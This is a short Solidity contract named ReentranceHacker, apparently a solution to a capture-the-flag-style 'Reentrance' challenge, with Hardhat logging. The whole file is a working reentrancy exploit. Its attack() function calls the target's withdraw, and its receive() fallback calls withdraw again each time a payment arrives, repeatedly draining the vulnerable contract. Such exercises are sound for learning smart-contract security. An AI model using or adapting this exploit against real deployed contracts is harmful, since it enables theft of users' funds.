// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./reentrance.sol";
import "hardhat/console.sol";

contract ReentranceHacker {
    Reentrance reentrance;
    uint public amount;
    constructor(address payable _reentrance, uint _amount) public {
        reentrance = Reentrance(_reentrance);
        amount = _amount;
    }

    function attack() public {
        console.log("enter attack");
        reentrance.withdraw(amount);
        console.log("exit attack");
    }

    receive() external payable {
        require(msg.value > 0);
        console.log("enter receive");
        reentrance.withdraw(msg.value);
        console.log("exit receive");
    }

}